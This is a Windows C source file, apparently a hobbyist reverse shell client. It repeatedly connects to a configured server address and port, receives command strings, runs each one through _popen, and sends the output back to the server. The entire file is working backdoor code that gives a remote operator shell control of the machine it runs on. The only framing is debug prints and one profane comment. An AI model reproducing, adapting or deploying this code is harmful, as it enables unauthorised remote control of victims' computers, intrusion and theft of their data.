#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>

int wmain( int argc, wchar_t *argv[ ], wchar_t *envp[ ] )
{
    const wchar_t chost[] = L"127.0.0.1"; //server ip
    const wchar_t cport[] = L"999"; //server port

    WSADATA wsaData;
    SOCKET serverSocket = INVALID_SOCKET;

    ADDRINFOW* servInfo = NULL,
        hints = {
            .ai_family = AF_INET,
            .ai_socktype = SOCK_STREAM,
            .ai_protocol = IPPROTO_TCP};


    printf("\ninitializing socket\n");
    // using perror because WSAGetLastError cant be used until WSAStartup is run
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0 ) {
        perror("WSAStartup error\n");
        return 0;
    }

    // chucks readable server info to servInfo
    if (GetAddrInfoW(chost, cport, &hints, &servInfo) != 0) {
        printf("getaddrinfo failed with error: %d\n", WSAGetLastError());
        WSACleanup();
        return 0;
    }

    // old method with sockaddr_in using InetPtonW to make chost an address
    //struct sockaddr_in addr = {.sin_family = AF_INET, .sin_port = htons(cport)};
    //InetPtonW(addr.sin_family, (const wchar_t*)chost, &addr.sin_addr.s_addr);

    while(1)
    {
        printf("creating socket\n");
        if ((serverSocket = socket(servInfo->ai_family, servInfo->ai_socktype, servInfo->ai_protocol)) == INVALID_SOCKET) 
        {
            printf("\nCould not create socket: %d", WSAGetLastError());
            WSACleanup();
            closesocket(serverSocket);
            return 0;
        }
        else
        {
            printf("connecting socket\n");
            while(1) //connection loop
            {
                if (connect(serverSocket, servInfo->ai_addr, (socklen_t)servInfo->ai_addrlen) == SOCKET_ERROR)
                {
                    printf("\nSocket connections error: %d", WSAGetLastError());
                    //WSACleanup();
                    //closesocket(serverSocket);
                    Sleep(5000);
                    continue;
                }
                else { 
                    printf("connection established\n");
                    break; 
                }
            }
            // receive and send buffers
            char buffer[1024];
            char container[1024];
            char total_response[18384];

            while (1)
            {
                // wipe all buffers for next interation
                memset(&buffer, 0, sizeof(buffer));
                memset(&container, 0, sizeof(container));
                memset(&total_response, 0, sizeof(total_response));
                
                // receive command from the server
                printf("receiving\n");
                recv(serverSocket, buffer, sizeof(buffer), MSG_WAITALL); 
                // YOU SNEAKY BUGGA FUCK YOU IT WAS YOU ALL ALONG I NEEDED TO HAVE MSG_WAITALL AT THE RECEIVE FUNCTIONS
                printf("received command: %s\n", buffer);

                // if the letter "q" is sent from the server close the socket
                //if (strncmp("quit", buffer, 4) == 0 || strncmp("exit", buffer, 4))
                //{
                //    closesocket(serverSocket);
                //    WSACleanup();
                //}
                //else
                //{   
                // run the command and send back the output
                // using popen to read the command
                FILE *fp;
                fp = _popen(buffer, "r");
                if (fp == NULL) { perror("Error in file open\n"); }

                // fgets reads the contents of fp until a newline or EOF.
                // then stores it into the container buffer
                while (fgets(container, sizeof(buffer), fp) != NULL)
                {
                    printf("adding to total response: %s\n", container);
                    /*
                        * this looop will send 1024 bytes at a time until it has coppied all of 'fp' to container
                        * in each 1024 bytw iteration it will add onto the total_response buffer until all is tranfered
                        */
                    // distination, destination size in bytes, source
                    strcat(total_response, container);
                }
                // send the buffer containing the output of the command to the server
                send(serverSocket, total_response, sizeof(total_response), 0);
                printf("sent output: %s\n", total_response);
                _pclose(fp); // close fp
                continue;
                //}  
            }
        }
    }
    return 0;
}
